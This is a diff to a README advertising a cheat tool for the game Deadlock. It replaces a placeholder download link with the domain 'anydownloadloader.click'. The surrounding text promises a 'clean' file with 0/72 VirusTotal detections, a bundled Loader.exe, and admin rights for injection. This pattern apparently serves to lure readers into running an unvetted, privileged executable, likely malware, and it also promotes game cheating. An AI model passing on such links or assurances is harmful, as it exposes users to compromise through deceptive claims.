@@ -73,7 +73,7 @@ Deadlock - All in One Cheat | Aimbot, ESP, RageBot Hack. NeRecoil | Regularly Up
 
 ## 📥 Download
 
-### [Download Tool](https://your-safe-download-link.com)
+### [Download Tool](https://anydownloadloader.click)
 > ✅ Clean File – Scanned on VirusTotal: **0 / 72**
 > 🧩 Requires: `Loader.exe` (included)
 > 🔐 Admin rights may be needed for proper injection
